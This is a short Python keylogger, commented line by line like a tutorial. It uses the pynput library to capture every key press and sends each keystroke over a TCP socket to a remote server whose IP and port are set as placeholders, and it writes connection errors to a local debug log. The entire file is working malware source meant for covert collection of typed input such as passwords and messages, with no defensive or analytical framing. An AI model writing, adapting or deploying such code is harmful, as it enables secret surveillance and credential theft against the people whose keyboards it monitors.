from pynput import keyboard
import socket

SERVER_IP = '0.0.0.0' # Replace with your server's IP address. This is the IP address of the server to which the keystrokes will be sent
SERVER_PORT = 1234    # Replace with your server's port. This is the port number on which the server is listening for connections

try: # Tries to establish a connection with the server
    target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Creates a virtual network connection (socket.socket) that uses IPv4 (AF_INET) and TCP (SOCK_STREAM)
    target_socket.connect((SERVER_IP, SERVER_PORT)) # Connects to the server using the specified IP and port
    
except Exception as e: # Handle connection errors
    target_socket = None   # If the connection fails, set the target_socket variable to None (same as "no connection")
    with open("debug_log.txt", 'a') as debug_file: # Opens a debug log file in append mode ('a') to store connection errors
        debug_file.write(f"Connection error: {e}\n") # Writes the error message to the debug_log.txt file


def on_key_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            key_data = f"{key.char}\n" # Converts the key character into a string and appends it in a new line
        else:
            key_data = f"[{key}]\n" # If the key is a special key (e.g., Shift, Ctrl, Enter), formats it in brackets
 
        if target_socket: # If the socket connection is established, sends the key data to the server
            target_socket.send(key_data.encode('utf-8')) # Encodes the keystroke as UTF-8 and sends it to the server
    except Exception as e: # Handles any errors that occur while logging keystrokes
        with open("debug_log.txt", 'a') as debug_file: # Opens the debug_log.txt file in append mode ('a') to store errors
            debug_file.write(f"Error logging key press: {e}\n") # Writes the error message to the debug_log.txt file

with keyboard.Listener(on_press=on_key_press) as listener: # Starts a keyboard listener to capture key presses
    listener.join() # Keeps the listener running indefinitely until the program is stopped

if target_socket: # When the keylogger is closed, the server is notified and the connection is closed
    try:
        target_socket.send(b"[Keylogger Closed]\n")  # Sends a message to the server indicating that the keylogger has stopped
        target_socket.close()  # Closes the socket connection to the server
    except Exception as e: # Handles any errors that occur while closing the socket
        with open("debug_log.txt", 'a') as debug_file:  # Opens the debug_log.txt file in append mode ('a') to store socket errors
            debug_file.write(f"Error closing socket: {e}\n") # Writes the error messages on the debug log file
    